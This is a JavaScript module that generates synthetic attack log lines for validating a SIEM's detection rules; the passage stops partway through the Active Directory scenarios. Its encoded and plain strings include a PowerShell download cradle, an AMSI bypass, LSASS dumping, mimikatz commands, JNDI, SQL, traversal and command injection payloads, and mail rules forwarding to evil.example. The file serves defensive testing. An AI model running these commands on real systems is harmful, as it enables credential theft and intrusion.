// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
/*
 * Detection validation scenarios — CLEARLY LABELLED SYNTHETIC ATTACK EVENTS, one set per built-in rule.
 *
 *   buildScenarios({ now, tag, rnd }) → { tag, scenarios: [{ id, title, platform, rules[], items[{ line }], learning?, intel? }],
 *                                         intel: { domain, ip, hash }, skipped: [{ rule, reason }] }
 *
 * Every event is a raw log line exactly as the real source sends it (Windows agent JSON, sshd/sudo syslog, FortiGate
 * key=value, nginx access log, Microsoft 365 / Graph JSON, Exchange message tracking / IIS), so the whole path is
 * exercised: collector → parser → enrichment → detection → alert. Nothing here touches a real system.
 *
 * Labelling: every host name, user name and file name carries "ashval-<tag>" (tag = random per run), IP addresses come
 * from the documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or 10.250.0.0/16, domains end in
 * .invalid / .example. A fresh tag and fresh addresses per run keep runs apart (alerts de-duplicate per group).
 * Attack-tool strings are base64-encoded here so endpoint antivirus does not quarantine this file.
 *
 * Not replayable (reported as SKIPPED with the reason): scheduled search rules and rules that need a learned baseline.
 */
const crypto = require('node:crypto');

const d = (b) => Buffer.from(b, 'base64').toString('utf8').replace(/~/g, '\\');
const X = {
  enc: d('cG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLWVuYyBTUUJGQUZnQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQUNrQQ=='),
  cradle: d('cG93ZXJzaGVsbCAtYyAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMjAzLjAuMTEzLjUvYS5wczEnKSI='),
  amsi: d('W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp'),
  comsvcs: d('cnVuZGxsMzIuZXhlIEM6fndpbmRvd3N+U3lzdGVtMzJ+Y29tc3Zjcy5kbGwsIE1pbmlEdW1wIDYyNCBDOn50ZW1wfm91dC5kbXAgZnVsbA=='),
  mimi: d('bWltaWthdHouZXhlICJwcml2aWxlZ2U6OmRlYnVnIiAic2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRzIiBleGl0'),
  jndi: d('L2FwaT9xPSR7am5kaTpsZGFwOi8vMjAzLjAuMTEzLjkvYX0='),
  pshell: d('L2F1dG9kaXNjb3Zlci9hdXRvZGlzY292ZXIuanNvbj9AZXZpbC5leGFtcGxlL3Bvd2Vyc2hlbGwvP1gtUnBzLUNBVD1WZ0VBVkFkWGFXNWtiM2R6UXdCQkNFdGxjbUpsY205eiZFbWFpbD1hdXRvZGlzY292ZXIvYXV0b2Rpc2NvdmVyLmpzb24lM0ZAZXZpbC5leGFtcGxl'),
  plogon: d('L2VjcC95Lmpz'),
  shell: d('L2FzcG5ldF9jbGllbnQvc3lzdGVtX3dlYi9hYmN4eXouYXNweA=='),
};

const SKIPPED = [
  { rule: 'SENTRA-SCH-001', reason: 'scheduled search rule (runs every few minutes over stored events) - test with a real failed-logon storm' },
  { rule: 'SENTRA-SCH-002', reason: 'scheduled search rule - test by stopping a real log source (endpoint test)' },
  { rule: 'SENTRA-OPS-900', reason: 'the SIEM pipeline canary - run end to end every few minutes by engine/ops/canary.js itself (Pipeline Health)' },
  { rule: 'SENTRA-ORAP-020', reason: 'GoldenGate process state is read from the database (DBA_CAPTURE / DBA_APPLY), not a log line - test by stopping a test Replicat' },
  { rule: 'SENTRA-ORAP-021', reason: 'GoldenGate lag is read from the database (capture / apply watermarks), not a log line - test with a paused test Replicat' },
  { rule: 'SENTRA-ORAP-030', reason: 'Data Guard transport state is read from the primary (V$ARCHIVE_DEST_STATUS), not a log line - test by deferring a test standby destination' },
  { rule: 'SENTRA-ORAP-031', reason: 'Data Guard lag is read from the database (V$ARCHIVED_LOG / V$DATAGUARD_STATS), not a log line - test by stopping apply on a test standby' },
  { rule: 'SENTRA-ORAP-032', reason: 'Standby apply processes and gaps are read from the database (V$DATAGUARD_PROCESS / V$ARCHIVE_GAP) - test by cancelling managed recovery on a test standby' },
  { rule: 'SENTRA-ORAP-033', reason: 'Primary protection settings are read from V$DATABASE, not a log line - test with NO FORCE LOGGING on a test primary' },
  { rule: 'SENTRA-ORAP-034', reason: 'Data Guard errors are read from V$DATAGUARD_STATUS / V$DG_BROKER_CONFIG - test with a broken standby connect string on a test configuration' },
  { rule: 'SENTRA-ORAP-040', reason: 'File system usage is read from the database server over SSH, not a log line - test by filling a test volume' },
  { rule: 'SENTRA-ORAP-041', reason: 'Instance / memory / load state is read from the database server over SSH - test by stopping a test instance listed in oratab' },
  { rule: 'SENTRA-ORAP-050', reason: 'Committed changes are read from the redo by the Change Stream (LogMiner), not a log line - test with a DELETE of 1000+ rows in a followed test schema' },
  { rule: 'SENTRA-ORAP-051', reason: 'Read from the redo by the Change Stream - test with an UPDATE from sqlplus on a followed test schema' },
  { rule: 'SENTRA-ORAP-052', reason: 'Raised by the platform\'s own replication / Change Stream state - test by causing a conflict on a test target' },
  { rule: 'SENTRA-ORAP-053', reason: 'Raised by a Data Verify comparison - test by changing one row on a test target and comparing' },
];

const pad = (n, w = 2) => String(n).padStart(w, '0');
const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

function buildScenarios({ now = Date.now(), tag, rnd = Math.random } = {}) {
  tag = String(tag || crypto.randomBytes(3).toString('hex')).toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 10) || 'run';
  const P = `ashval-${tag}`;
  const pick = (lo, hi) => lo + Math.floor(rnd() * (hi - lo + 1));
  const ext = () => `${pick(0, 1) ? '198.51.100' : '203.0.113'}.${pick(1, 254)}`;
  const intIp = () => `10.250.${pick(1, 254)}.${pick(1, 254)}`;
  const base = now - 10 * 60000; // events are dated "10 minutes ago" onwards, one second apart per scenario
  let clock = base;
  const at = (stepMs = 1000) => (clock += stepMs);
  const iso = (ms) => new Date(ms).toISOString();
  const host = (s) => `${P}-${s}`;
  const user = (s) => `${P.replace(/-/g, '_')}_${s}`;
  const scenarios = [];
  const add = (id, title, platform, rules, items, extra) => scenarios.push(Object.assign({ id, title, platform, rules, items: items.map((line) => ({ line })) }, extra || {}));
  const times = (n, f) => Array.from({ length: n }, (_, i) => f(i));

  // ---- formats
  const win = (eid, ed, o = {}) => JSON.stringify(Object.assign({ Channel: 'Security', ProviderName: 'Microsoft-Windows-Security-Auditing', EventID: eid, Computer: `${o.host || host('dc01')}.validation.invalid`, TimeCreated: iso(o.ts || at()), EventData: ed }, o.extra || {}));
  const sysmon = (eid, ed, o = {}) => win(eid, ed, Object.assign({}, o, { extra: { Channel: 'Microsoft-Windows-Sysmon/Operational', ProviderName: 'Microsoft-Windows-Sysmon' } }));
  const syslog = (pri, hostName, app, msg, ts = at()) => { const t = new Date(ts); return `<${pri}>${MON[t.getUTCMonth()]} ${String(t.getUTCDate()).padStart(2, ' ')} ${pad(t.getUTCHours())}:${pad(t.getUTCMinutes())}:${pad(t.getUTCSeconds())} ${hostName} ${app}: ${msg}`; };
  const fgt = (kv, ts = at()) => { const t = new Date(ts); return `<189>date=${t.toISOString().slice(0, 10)} time=${t.toISOString().slice(11, 19)} devname="${host('fw')}" devid="FGVALIDATION" eventtime=${Math.floor(ts / 1000)} tz="+0000" vd="root" ${kv}`; };
  const web = (ip, url, status, ua = 'Mozilla/5.0', ts = at()) => { const t = new Date(ts); return syslog(190, host('web01'), 'nginx', `${ip} - - [${pad(t.getUTCDate())}/${MON[t.getUTCMonth()]}/${t.getUTCFullYear()}:${pad(t.getUTCHours())}:${pad(t.getUTCMinutes())}:${pad(t.getUTCSeconds())} +0000] "GET ${url} HTTP/1.1" ${status} 512 "-" "${ua}"`, ts); };
  const m365 = (o, ts = at()) => JSON.stringify(Object.assign({ CreationTime: iso(ts).replace('Z', ''), Workload: 'Exchange', UserId: `${user('admin')}@validation.example`, ClientIP: `${ext()}:51000`, ResultStatus: 'True' }, o));
  const cmd = (Operation, params, o) => m365(Object.assign({ RecordType: 1, Operation, ObjectId: user('ceo'), Parameters: Object.entries(params).map(([Name, Value]) => ({ Name, Value })) }, o || {}));
  const signin = (o, ts = at()) => JSON.stringify(Object.assign({ id: crypto.randomUUID(), createdDateTime: iso(ts), userPrincipalName: `${user('ceo')}@validation.example`, ipAddress: ext(), appDisplayName: 'Office 365 Exchange Online', clientAppUsed: 'Browser', status: { errorCode: 0 } }, o));
  const winEx = (cmdlet, params) => win(1, { Data0: cmdlet, Data1: params, Data2: `validation.invalid/Users/${user('exadmin')}` }, { host: host('ex01'), extra: { Channel: 'MSExchange Management', ProviderName: 'MSExchange CmdletLogs', Level: 4 } });
  const iis = (url, ip, o = {}) => {
    const ts = o.ts || at(); const t = new Date(ts); const q = url.indexOf('?');
    // forwarded by rsyslog imfile (agents/linux/62-sentra-siem-exchange.conf): the syslog header carries the server name
    return syslog(174, host('ex01'), `exiis-${host('ex01')}`, `${t.toISOString().slice(0, 10)} ${t.toISOString().slice(11, 19)} 10.250.0.5 ${o.method || 'GET'} ${q < 0 ? url : url.slice(0, q)} ${q < 0 ? '-' : url.slice(q + 1)} 443 ${o.user || '-'} ${ip} Mozilla/5.0+(Windows+NT+10.0) - ${o.status || 200} 0 0 15`, ts);
  };
  const msgtrk = (i, sender, ts = at(500)) => syslog(174, host('ex01'), `exmsgtrk-${host('ex01')}`, `${iso(ts)},10.250.0.20,${host('ex01')},198.51.100.25,mx.external.example,,${host('ex01')}\\Internet Send Connector,SMTP,SEND,${1000 + i},<m${i}.${tag}@validation.example>,guid-${tag}-${i},r${i}@external.example,250 2.0.0 OK,4096,1,,,Validation test ${tag},${sender},${sender},,Originating,,,,,,,`, ts);

  // ================= Windows (agent JSON)
  {
    const u = user('alice'); const src = intIp();
    add('win-bruteforce', 'Brute force against one account, then a successful logon', 'Windows', ['SENTRA-AUTH-001', 'SENTRA-AUTH-003'], [
      ...times(12, () => win(4625, { TargetUserName: u, TargetDomainName: 'VALIDATION', LogonType: '3', IpAddress: src, Status: '0xC000006D', SubStatus: '0xC000006A' })),
      win(4624, { TargetUserName: u, TargetDomainName: 'VALIDATION', LogonType: '3', IpAddress: src }),
    ]);
  }
  {
    const src = ext();
    add('win-spray', 'Password spraying: one source, many accounts', 'Windows', ['SENTRA-AUTH-002'], times(15, (i) => win(4625, { TargetUserName: user(`spray${i}`), TargetDomainName: 'VALIDATION', LogonType: '3', IpAddress: src, Status: '0xC000006D', SubStatus: '0xC000006A' })));
  }
  add('win-disabled', 'Logon attempt with a disabled account', 'Windows', ['SENTRA-AUTH-004'], [win(4625, { TargetUserName: user('olduser'), TargetDomainName: 'VALIDATION', LogonType: '3', IpAddress: intIp(), Status: '0xC000006E', SubStatus: '0xC0000072' })]);
  add('win-lockout', 'Account locked out', 'Windows', ['SENTRA-AUTH-005'], [win(4740, { TargetUserName: user('bob'), TargetDomainName: 'VALIDATION', SubjectUserName: `${host('dc01')}$`, SubjectDomainName: 'VALIDATION' })]);
  add('win-rdp-public', 'RDP logon from a public IP address', 'Windows', ['SENTRA-AUTH-006'], [win(4624, { TargetUserName: user('rdpuser'), TargetDomainName: 'VALIDATION', LogonType: '10', IpAddress: ext() })]);
  {
    // last 23:00 Asia/Riyadh (20:00 UTC) before now — the rule looks at the event's own time
    const night = new Date(now); night.setUTCHours(20, 0, 0, 0); if (night.getTime() > now) night.setUTCDate(night.getUTCDate() - 1);
    add('win-after-hours', 'Admin account logon outside business hours', 'Windows', ['SENTRA-AUTH-007'], [win(4624, { TargetUserName: user('admin'), TargetDomainName: 'VALIDATION', LogonType: '2' }, { ts: night.getTime() })]);
  }
  {
    const nu = user('newacct'); const sid = `S-1-5-21-1-2-3-${pick(10000, 99999)}`;
    add('win-user-created', 'New user account created and enabled', 'Windows', ['SENTRA-IAM-003', 'SENTRA-IAM-004'], [
      win(4720, { SubjectUserName: user('helpdesk'), SubjectDomainName: 'VALIDATION', TargetUserName: nu, TargetDomainName: 'VALIDATION', TargetSid: sid }),
      win(4722, { SubjectUserName: user('helpdesk'), SubjectDomainName: 'VALIDATION', TargetUserName: nu, TargetDomainName: 'VALIDATION', TargetSid: sid }),
    ]);
  }
  add('win-priv-group', 'Member added to the Administrators group', 'Windows', ['SENTRA-IAM-001', 'SENTRA-IAM-002'], [
    win(4732, { SubjectUserName: user('helpdesk'), SubjectDomainName: 'VALIDATION', MemberName: `CN=${user('mallory')},OU=Users,DC=validation,DC=invalid`, MemberSid: `S-1-5-21-1-2-3-${pick(10000, 99999)}`, TargetUserName: 'Administrators', TargetDomainName: 'Builtin', TargetSid: 'S-1-5-32-544' }),
  ]);
  add('win-log-cleared', 'Security audit log cleared', 'Windows', ['SENTRA-SYS-001'], [win(1102, { SubjectUserName: user('mallory'), SubjectDomainName: 'VALIDATION' })]);
  add('win-service', 'New service installed from a user-writable path', 'Windows', ['SENTRA-SYS-002', 'SENTRA-SYS-003'], [
    win(7045, { ServiceName: `${P}-svc`, ImagePath: `C:\\Users\\Public\\${P}.exe`, ServiceType: 'user mode service', StartType: 'auto start', AccountName: 'LocalSystem' }, { host: host('srv01'), extra: { Channel: 'System', ProviderName: 'Service Control Manager' } }),
  ]);
  add('win-task', 'Scheduled task created', 'Windows', ['SENTRA-SYS-004'], [
    win(4698, { SubjectUserName: user('bob'), SubjectDomainName: 'VALIDATION', TaskName: `\\${P}-task`, TaskContent: `<Task><Actions><Exec><Command>C:\\Users\\Public\\${P}.exe</Command></Exec></Actions></Task>` }, { host: host('pc01') }),
  ]);
  const proc = (cmdline, image, h) => win(4688, { SubjectUserName: user('bob'), SubjectDomainName: 'VALIDATION', NewProcessName: image, ParentProcessName: 'C:\\Windows\\explorer.exe', CommandLine: cmdline, NewProcessId: '0x1a2b', ProcessId: '0x1000' }, { host: host(h) });
  add('win-encoded-ps', 'PowerShell encoded command', 'Windows', ['SENTRA-EXEC-001'], [proc(X.enc, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'pc02')]);
  add('win-download-cradle', 'PowerShell download cradle', 'Windows', ['SENTRA-EXEC-002'], [proc(X.cradle, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'pc03')]);
  add('win-amsi-bypass', 'AMSI bypass attempt (script block)', 'Windows', ['SENTRA-EXEC-003'], [win(4104, { ScriptBlockText: X.amsi, ScriptBlockId: crypto.randomUUID(), MessageNumber: '1', MessageTotal: '1' }, { host: host('pc04'), extra: { Channel: 'Microsoft-Windows-PowerShell/Operational', ProviderName: 'Microsoft-Windows-PowerShell' } })]);
  add('win-lsass-dump', 'LSASS memory dump attempt', 'Windows', ['SENTRA-CRED-001'], [proc(X.comsvcs, 'C:\\Windows\\System32\\rundll32.exe', 'pc05')]);
  add('win-mimikatz', 'Credential theft tool indicators', 'Windows', ['SENTRA-CRED-002'], [proc(X.mimi, `C:\\Users\\Public\\${P}-m.exe`, 'pc06')]);
  add('win-lsass-access', 'Suspicious access to LSASS memory (Sysmon 10)', 'Windows', ['SENTRA-CRED-003'], [sysmon(10, { SourceImage: `C:\\Users\\Public\\AppData\\Local\\Temp\\${P}.exe`, TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1010', SourceProcessId: '4242', TargetProcessId: '624' }, { host: host('pc07') })]);
  {
    const u = `${user('kerb')}@VALIDATION.INVALID`; const src = `::ffff:${intIp()}`;
    add('win-kerberoast', 'Kerberoasting: RC4 service tickets for many SPNs', 'Windows', ['SENTRA-CRED-004', 'SENTRA-CRED-005'], times(6, (i) => win(4769, { TargetUserName: u, ServiceName: `${P}-sql${i}`, IpAddress: src, Status: '0x0', TicketEncryptionType: '0x17' })));
  }
  add('win-asrep', 'AS-REP roasting (Kerberos pre-auth not required)', 'Windows', ['SENTRA-CRED-006'], [win(4768, { TargetUserName: user('svclegacy'), TargetDomainName: 'VALIDATION', IpAddress: `::ffff:${intIp()}`, Status: '0x0', PreAuthType: '0', TicketEncryptionType: '0x17' })]);

  // ================= Linux (syslog)
  {
    const h = host('lnx01'); const src = ext();
    add('lnx-ssh-bruteforce', 'SSH brute force from one source', 'Linux', ['SENTRA-LNX-001'], times(20, (i) => syslog(38, h, `sshd[${1000 + i}]`, `Failed password for invalid user ${user(`u${i}`)} from ${src} port ${40000 + i} ssh2`)));
    add('lnx-root-ssh', 'Root logon over SSH', 'Linux', ['SENTRA-LNX-002'], [syslog(86, h, 'sshd[2000]', `Accepted publickey for root from ${intIp()} port 50000 ssh2`)]);
    add('lnx-sudo-shell', 'sudo to an interactive root shell', 'Linux', ['SENTRA-LNX-003'], [syslog(85, h, 'sudo', `   ${user('alice')} : TTY=pts/0 ; PWD=/home/${user('alice')} ; USER=root ; COMMAND=/bin/bash`)]);
    add('lnx-sudo-fail', 'Repeated sudo authentication failures', 'Linux', ['SENTRA-LNX-004'], times(3, () => syslog(85, h, 'sudo', `   ${user('bob')} : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/${user('bob')} ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow`)));
    add('lnx-useradd', 'Linux user account created', 'Linux', ['SENTRA-IAM-004'], [syslog(86, h, 'useradd[3000]', `new user: name=${user('backdoor')}, UID=${pick(2000, 60000)}, GID=1337, home=/home/${user('backdoor')}, shell=/bin/bash`)]);
  }

  // ================= FortiGate (key=value syslog)
  add('fgt-ips', 'IPS detection, critical severity', 'FortiGate', ['SENTRA-FGT-001'], [fgt(`logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" severity="critical" srcip=${ext()} dstip=${intIp()} srcport=4444 dstport=443 proto=6 action="dropped" attack="Validation.Test.Signature.${tag}" crlevel="critical"`)]);
  add('fgt-av', 'Antivirus detection (EICAR test file)', 'FortiGate', ['SENTRA-FGT-002'], [fgt(`logid="0211008192" type="utm" subtype="virus" eventtype="infected" level="warning" srcip=${ext()} dstip=${intIp()} srcport=80 dstport=51000 proto=6 action="blocked" service="HTTP" virus="EICAR_TEST_FILE" filename="${P}-eicar.com" hostname="eicar.validation.invalid" url="/${P}-eicar.com"`)]);
  {
    const src = intIp(); const c = pick(1, 200);
    add('fgt-scan', 'Internal host denied towards many destinations (scan)', 'FortiGate', ['SENTRA-FGT-003', 'SENTRA-FGT-004'], times(210, (i) => fgt(`logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=${src} dstip=10.251.${(c + Math.floor(i / 250)) % 255}.${(i % 250) + 1} srcport=${50000 + i} dstport=${i % 2 ? 445 : 3389} proto=6 action="deny" policyid=99`, at(200))));
  }
  {
    const src = ext();
    add('fgt-vpn-fail', 'VPN login failure burst', 'FortiGate', ['SENTRA-FGT-005'], times(12, (i) => fgt(`logid="0101039426" type="event" subtype="vpn" level="alert" logdesc="SSL VPN login fail" action="ssl-login-fail" tunneltype="ssl-web" remip=${src} user="${user(`vpn${i}`)}" reason="sslvpn_login_permission_denied" msg="SSL user failed to logged in"`)));
  }
  {
    const src = intIp(); const dst = ext();
    add('fgt-exfil', 'Large outbound transfer to one external IP', 'FortiGate', ['SENTRA-EXFIL-001'], times(3, (i) => fgt(`logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=${src} dstip=${dst} srcport=${52000 + i} dstport=443 proto=6 action="close" policyid=12 sentbyte=${400 * 1024 * 1024} rcvdbyte=1000`)));
  }
  {
    const u = user('fgadmin');
    add('fgt-admin-new-ip', 'FortiGate admin login from a new source address (needs a learned baseline)', 'FortiGate', ['SENTRA-FGT-006'], [
      fgt(`logid="0100032001" type="event" subtype="system" level="information" logdesc="Admin login successful" user="${u}" ui="https(10.250.0.5)" action="login" status="success" msg="Administrator ${u} logged in successfully"`, now - 9 * 86400000),
      fgt(`logid="0100032001" type="event" subtype="system" level="information" logdesc="Admin login successful" user="${u}" ui="https(${intIp()})" action="login" status="success" msg="Administrator ${u} logged in successfully"`),
    ], { learning: true });
  }

  // ================= Web server (nginx / apache access log)
  {
    const scanner = ext();
    add('web-scan', 'Web scanning: many 404 responses from one source', 'Web', ['SENTRA-WEB-001'], times(60, (i) => web(scanner, `/${P}-probe${i}.php`, 404)));
  }
  add('web-sqli', 'SQL injection pattern in URL', 'Web', ['SENTRA-WEB-002'], [web(ext(), `/login?user=${tag}%27%20OR%20%271%27=%271`, 200)]);
  add('web-traversal', 'Path traversal in URL', 'Web', ['SENTRA-WEB-003'], [web(ext(), `/download?file=../../../../etc/passwd&v=${tag}`, 200)]);
  add('web-cmd-injection', 'Command / JNDI injection in URL', 'Web', ['SENTRA-WEB-004'], [web(ext(), `/ping?host=127.0.0.1;cat%20/etc/shadow&v=${tag}`, 200), web(ext(), X.jndi, 200)]);
  add('web-attack-tool', 'Known attack tool user agent', 'Web', ['SENTRA-WEB-005'], [web(ext(), `/?v=${tag}`, 200, 'sqlmap/1.7.2#stable (https://sqlmap.org)')]);

  // ================= Microsoft 365 (Graph sign-ins + Management Activity API)
  add('m365-risky-signin', 'Risky Microsoft 365 sign-in', 'Microsoft 365', ['SENTRA-M365-001'], [signin({ riskLevelDuringSignIn: 'high', riskState: 'atRisk', userPrincipalName: `${user('cfo')}@validation.example` })]);
  add('m365-mfa-fatigue', 'MFA fatigue: repeated MFA denials', 'Microsoft 365', ['SENTRA-M365-002'], times(6, () => signin({ status: { errorCode: 500121, failureReason: 'Authentication failed during strong authentication request.' } }, at(30000))));
  add('m365-mass-forwarding', 'Mass creation of mailbox forwarding', 'Microsoft 365', ['SENTRA-M365-004'], times(6, (i) => cmd('Set-Mailbox', { Identity: user(`mbx${i}`), ForwardingSmtpAddress: `smtp:${user(`x${i}`)}@external.example` }, { UserId: `${user(`m${i}`)}@validation.example` })));

  // ================= Exchange (online + on-prem + IIS + message tracking)
  add('exo-online-admin', 'Exchange Online: inbox rule, forwarding, permissions, roles, connector', 'Exchange', ['SENTRA-EXO-001', 'SENTRA-EXO-002', 'SENTRA-EXO-003', 'SENTRA-EXO-006', 'SENTRA-EXO-007', 'SENTRA-EXO-008'], [
    cmd('New-InboxRule', { Name: '.', ForwardTo: `${tag}@evil.example`, DeleteMessage: 'True' }),
    cmd('Set-Mailbox', { Identity: user('ceo'), ForwardingSmtpAddress: `smtp:${user('ceo')}.backup@mail.example` }),
    cmd('Add-MailboxPermission', { Identity: user('ceo'), User: `${user('attacker')}@validation.example`, AccessRights: 'FullAccess' }),
    cmd('New-ManagementRoleAssignment', { Role: 'ApplicationImpersonation', User: `${user('svcapp')}@validation.example` }),
    cmd('Set-InboundConnector', { Identity: `Inbound ${P}`, RequireTls: 'False' }),
  ]);
  {
    const del = `${user('delegate')}@validation.example`; const ip = ext();
    add('exo-many-mailboxes', 'One account reading many different mailboxes', 'Exchange', ['SENTRA-EXO-010'], times(6, (i) => m365({ RecordType: 50, Operation: 'MailItemsAccessed', UserId: del, MailboxOwnerUPN: `${user(`owner${i}`)}@validation.example`, ClientIPAddress: ip, OperationCount: 1, OperationProperties: [{ Name: 'MailAccessType', Value: 'Bind' }] }, at(30000))));
    const app = `${user('rogueapp')}@validation.example`; const owner = `${user('ceo')}@validation.example`;
    add('exo-mass-access', 'Mass MailItemsAccessed by one account', 'Exchange', ['SENTRA-EXO-009'], times(210, () => m365({ RecordType: 50, Operation: 'MailItemsAccessed', UserId: app, MailboxOwnerUPN: owner, ClientIPAddress: ip, OperationCount: 1, OperationProperties: [{ Name: 'MailAccessType', Value: 'Bind' }] }, at(1000))));
  }
  add('exo-onprem-cmdlets', 'Exchange on-prem: PST export, transport rule, role group, audit off', 'Exchange', ['SENTRA-EXO-004', 'SENTRA-EXO-005', 'SENTRA-EXO-016', 'SENTRA-EXO-017'], [
    winEx('New-MailboxExportRequest', `-Mailbox ${user('ceo')} -FilePath \\\\fileserver\\pst$\\${P}.pst`),
    winEx('New-TransportRule', `-Name "${P}" -SentToScope NotInOrganization -BlindCopyTo "collector@evil.example"`),
    winEx('Add-RoleGroupMember', `-Identity "Organization Management" -Member ${user('mallory')}`),
    winEx('Set-AdminAuditLogConfig', '-AdminAuditLogEnabled $false'),
  ]);
  {
    const sender = `${user('sales')}@validation.example`;
    add('exo-send-burst', 'Burst of external mail from one mailbox', 'Exchange', ['SENTRA-EXO-011'], times(110, (i) => msgtrk(i, sender)));
  }
  {
    const spike = ext();
    add('exo-iis-attacks', 'Exchange front end: exploitation, /ecp spike, web shell', 'Exchange', ['SENTRA-EXO-012', 'SENTRA-EXO-013', 'SENTRA-EXO-014'], [
      iis(X.pshell, ext()), iis(X.plogon, ext()), iis(X.shell, ext(), { method: 'POST' }),
      ...times(110, (i) => iis(`/ecp/?r=${tag}${i}`, spike, { status: 302, ts: at(300) })),
    ]);
  }
  {
    const u = user('exadmin');
    add('exo-remote-ps', 'Exchange remote PowerShell from a new host (needs a learned baseline)', 'Exchange', ['SENTRA-EXO-015'], [
      iis('/powershell?serializationLevel=Full;ExchClientVer=15.2', '10.250.0.30', { user: u, ts: now - 9 * 86400000 }),
      iis('/powershell?serializationLevel=Full;ExchClientVer=15.2', intIp(), { user: u }),
    ], { learning: true });
  }

  // ================= Active Directory changes (5136-5141 / 4662 / 4719 / 4739 from a domain controller, rules ad-changes.json)
  {
    const dom = 'DC=validation,DC=invalid', adm = user('adadmin'), corr = () => `{${crypto.randomUUID()}}`;
    const ds = (eid, ed) => win(eid, Object.assign({ SubjectUserName: adm, SubjectDomainName: 'VALIDATION', DSName: 'validation.invalid', DSType: '%%14676' }, ed));
    const mod = (c, dn, cls, attr, val, op) => ds(5136, { OpCorrelationID: c, ObjectDN: dn, ObjectGUID: `{${crypto.randomUUID()}}`, ObjectClass: cls, AttributeLDAPDisplayName: attr, AttributeValue: val, OperationType: op === 'old' ? '%%14675' : '%%14674' });
    const gpo = `{${crypto.randomUUID().toUpperCase()}}`, gpoDn = `CN=${gpo},CN=Policies,CN=System,${dom}`;
    const c1 = corr(), c2 = corr(), c3 = corr(), c4 = corr(), c5 = corr();
    const sid = `S-1-5-21-1-2-3-${pick(10000, 99999)}`;
    // dnsRecord octet string of an A record (MS-DNSP DNS_RPC_RECORD, TTL 3600) pointing at 10.250.x.y
    const aRec = (b3, b4) => '0400' + '0100' + '05f0' + '0000' + '01000000' + '00000e10' + '00000000' + '00000000' + '0afa' + pad(b3.toString(16)) + pad(b4.toString(16));
    const rec = `${P}-app`, zone = 'validation.invalid', recDn = `DC=${rec},DC=${zone},CN=MicrosoftDNS,DC=DomainDnsZones,${dom}`;
    add('ad-acl-adminsdholder', 'Permissions changed on AdminSDHolder (full control to an ordinary account)', 'Windows', ['SENTRA-ADC-001'], [
      mod(c1, `CN=AdminSDHolder,CN=System,${dom}`, 'container', 'nTSecurityDescriptor', 'O:DAG:DAD:PAI(A;;GA;;;DA)', 'old'),
      mod(c1, `CN=AdminSDHolder,CN=System,${dom}`, 'container', 'nTSecurityDescriptor', `O:DAG:DAD:PAI(A;;GA;;;DA)(A;;GA;;;${sid})`, 'new'),
    ]);
    add('ad-gpo-link', 'Group Policy linked and enforced on an OU', 'Windows', ['SENTRA-ADC-002'], [mod(c2, `OU=${P}-servers,${dom}`, 'organizationalUnit', 'gPLink', `[LDAP://cn=${gpo},cn=policies,cn=system,${dom};2]`, 'new')]);
    add('ad-gpo-change', 'Group Policy object created and edited', 'Windows', ['SENTRA-ADC-003'], [
      ds(5137, { OpCorrelationID: c3, ObjectDN: gpoDn, ObjectGUID: `{${crypto.randomUUID()}}`, ObjectClass: 'groupPolicyContainer' }),
      mod(c3, gpoDn, 'groupPolicyContainer', 'versionNumber', '0', 'old'), mod(c3, gpoDn, 'groupPolicyContainer', 'versionNumber', '1', 'new'),
    ]);
    add('ad-schema', 'Active Directory schema attribute changed', 'Windows', ['SENTRA-ADC-004'], [mod(c4, `CN=${P}-attr,CN=Schema,CN=Configuration,${dom}`, 'attributeSchema', 'isMemberOfPartialAttributeSet', 'TRUE', 'new')]);
    add('ad-dns-repoint', 'DNS record of a server repointed by another account', 'Windows', ['SENTRA-ADC-005'], [
      mod(c5, recDn, 'dnsNode', 'dnsRecord', aRec(pick(1, 254), pick(1, 254)), 'old'), mod(c5, recDn, 'dnsNode', 'dnsRecord', aRec(pick(1, 254), pick(1, 254)), 'new'),
    ]);
    add('ad-audit-policy', 'Audit policy weakened: Logon success and failure auditing removed', 'Windows', ['SENTRA-ADC-006'], [
      win(4719, { SubjectUserName: adm, SubjectDomainName: 'VALIDATION', CategoryId: '%%8273', SubcategoryId: '%%12544', SubcategoryGuid: '{0CCE9215-69AE-11D9-BED3-505054503030}', AuditPolicyChanges: '%%8448, %%8450' }),
    ]);
    add('ad-domain-policy', 'Domain lockout policy changed (lockout threshold 0)', 'Windows', ['SENTRA-ADC-007'], [
      win(4739, { SubjectUserName: adm, SubjectDomainName: 'VALIDATION', DomainPolicyChanged: 'Lockout Policy', DomainName: 'VALIDATION', DomainSid: 'S-1-5-21-1-2-3', LockoutThreshold: '0', LockoutDuration: '-', MinPasswordLength: '-' }),
    ]);
    add('ad-dcsync', 'Directory replication rights used by a user account (DCSync)', 'Windows', ['SENTRA-ADC-008'], [
